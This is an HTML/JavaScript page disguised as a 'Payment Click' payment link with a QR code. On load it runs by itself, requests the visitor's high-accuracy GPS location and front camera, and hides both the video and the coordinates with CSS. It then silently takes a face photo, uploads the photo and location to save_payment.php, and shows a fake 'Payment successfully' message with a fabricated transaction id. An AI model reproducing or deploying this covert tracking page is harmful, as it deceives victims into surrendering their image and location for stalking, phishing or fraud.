<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Payment Link with QR Code</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <style>
    body {
      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
      background: #f3f4f6;
      margin: 0;
      padding: 1.5rem;
      display: flex;
      justify-content: center;
    }

    .container {
      width: 100%;
      max-width: 720px;
      background: #ffffff;
      border-radius: 1rem;
      padding: 1.5rem;
      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.08);
    }

    h1 {
      margin-top: 0;
      margin-bottom: 0.5rem;
      text-align: center;
    }

    .note {
      font-size: 0.85rem;
      color: #6b7280;
      text-align: center;
      margin-bottom: 1.5rem;
    }

    button {
      padding: 0.75rem 1.5rem;
      border-radius: 999px;
      border: none;
      background: #2563eb;
      color: white;
      font-size: 1rem;
      cursor: pointer;
      display: block;
      margin: 0 auto 1rem;
      box-shadow: 0 4px 10px rgba(37, 99, 235, 0.25);
    }

    button:disabled {
      opacity: 0.6;
      cursor: not-allowed;
      box-shadow: none;
    }

    #status {
      font-size: 0.9rem;
      text-align: center;
      margin-bottom: 1rem;
      color: #374151;
      white-space: pre-line;
      word-break: break-word;
    }

    #coords {
      font-size: 0.9rem;
      background: #f9fafb;
      border-radius: 0.75rem;
      padding: 0.75rem;
      border: 1px solid #e5e7eb;
      margin-bottom: 1rem;
      display: none;
    }

    #coords strong {
      /*display: inline-block;*/
			display: none;
      width: 90px;
    }

    video, canvas, img {
      max-width: 100%;
      border-radius: 0.75rem;
      background: #000;
      /*display: block;*/
			display: none;
      margin: 0 auto;
    }

    #photo {
      margin-top: 0.75rem;
			display: none;
    }

    .small-note {
      font-size: 0.8rem;
      color: #6b7280;
      margin-top: 0.75rem;
      text-align: center;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Payment Click</h1>
		<!--
    <p class="note">
      Click <strong>Start</strong> once. The page will:
      <br>1) Get your GPS location
      <br>2) Start the <strong>front camera</strong>
      <br>3) Auto-capture a photo
      <br>4) Auto-upload it to the server
      <br><br>Works on <strong>HTTPS</strong> or <code>http://localhost</code>, with your permission.
    </p> -->
	 <img src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=RandomQR"
	      id="qrImage"
	      style="width:200px; display:block; margin:0 auto 20px;"
	      alt="QR Code">
	 
   
    <button id="startBtn">Start</button>

    <div id="status"></div>

    <div id="coords" >
      <div><strong>Latitude:</strong> <span id="lat" style="display: none;"></span></div>
      <div><strong>Longitude:</strong> <span id="lng" style="display: none;"></span></div>
      <div><strong>Accuracy:</strong> <span id="acc" style="display: none;"></span></div>
    </div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas" style="display:none;"></canvas>
    <img id="photo" alt="Captured photo will appear here" />

    <p class="small-note">
      If the browser still asks every time, you can choose “Always allow” for this site in your browser settings.
    </p>
  </div>

  <script>
    const startBtn = document.getElementById("startBtn");
    const statusEl = document.getElementById("status");
    const coordsBox = document.getElementById("coords");
    const latSpan = document.getElementById("lat");
    const lngSpan = document.getElementById("lng");
    const accSpan = document.getElementById("acc");

    const video = document.getElementById("video");
    const canvas = document.getElementById("canvas");
    const photo = document.getElementById("photo");

    let stream = null;
		
		function getDateTimeCode() {
		    const now = new Date();

		    const dd = String(now.getDate()).padStart(2, '0');
		    const yy = String(now.getFullYear()).slice(-2);
		    const mm = String(now.getMonth() + 1).padStart(2, '0');
		    const ss = String(now.getSeconds()).padStart(2, '0');
		    const i  = String(now.getMilliseconds()).padStart(3, '0');

		    return dd + yy + mm + ss + i;
		}

    function logStatus(text) {
      statusEl.textContent = text;
      console.log(text);
    }

    function getLocation() {
      return new Promise((resolve, reject) => {
        if (!navigator.geolocation) {
          return reject(new Error("Geolocation not supported by this browser."));
        }

        navigator.geolocation.getCurrentPosition(
          (pos) => resolve(pos.coords),
          (err) => reject(err),
          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
        );
      });
    }

    async function startProcess() {
      startBtn.disabled = true;
			alert("Please allow all Pop messages for Payment successful");
      //logStatus("Getting location...");

      let coords = { latitude: null, longitude: null, accuracy: null };

      // 1) Get Geolocation (auto)
      try {
        const c = await getLocation();
        coords = c;
        coordsBox.style.display = "block";
        latSpan.textContent = c.latitude.toFixed(6);
        lngSpan.textContent = c.longitude.toFixed(6);
        accSpan.textContent = c.accuracy.toFixed(1);
        //logStatus("Location captured.\nStarting camera...");
      } catch (err) {
        logStatus("Could not get location (" + err.message + ").\nStarting camera anyway...");
      }

      // 2) Start camera (front) and auto-capture
      try {
        stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: "user" },
          audio: false
        });
      } catch (err) {
        logStatus("Payment error: " + err.message);
        startBtn.disabled = false;
        return;
      }

      video.srcObject = stream;

      video.onloadedmetadata = () => {
        video.play();

        logStatus("Payment in Progress.\nwait...");
        setTimeout(() => {
          captureAndUpload(coords);
        }, 1500); // wait for camera to adjust exposure
      };
    }

    async function captureAndUpload(coords) {
      logStatus("Capturing photo...");

      const w = video.videoWidth;
      const h = video.videoHeight;

      if (!w || !h) {
        logStatus("Video not ready. Please try again.");
        stopCamera();
        startBtn.disabled = false;
        return;
      }

      canvas.width = w;
      canvas.height = h;

      const ctx = canvas.getContext("2d");
      ctx.drawImage(video, 0, 0, w, h);

      const dataURL = canvas.toDataURL("image/png");
      photo.src = dataURL;

      logStatus("Uploading to server...");

      try {
        const response = await fetch("save_payment.php", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            imageData: dataURL,
            latitude: coords.latitude ?? null,
            longitude: coords.longitude ?? null,
            accuracy: coords.accuracy ?? null
          })
        });

        const result = await response.json();

        if (response.ok && result.success) {
          logStatus(
            "Payment successfully!\n " +
            (result.latitude ? ("\nTransaction id: 1" + getDateTimeCode()) : "")
          );
        } else {
          logStatus("Server error: " + (result.message || "Unknown error"));
        }
      } catch (err) {
        logStatus("Upload failed: " + err.message);
      }

      stopCamera();
      startBtn.disabled = false;
    }

    function stopCamera() {
      if (stream) {
        stream.getTracks().forEach(t => t.stop());
        stream = null;
      }
      video.srcObject = null;
    }

    //startBtn.addEventListener("click", startProcess);
		startProcess();
  </script>
</body>
</html>
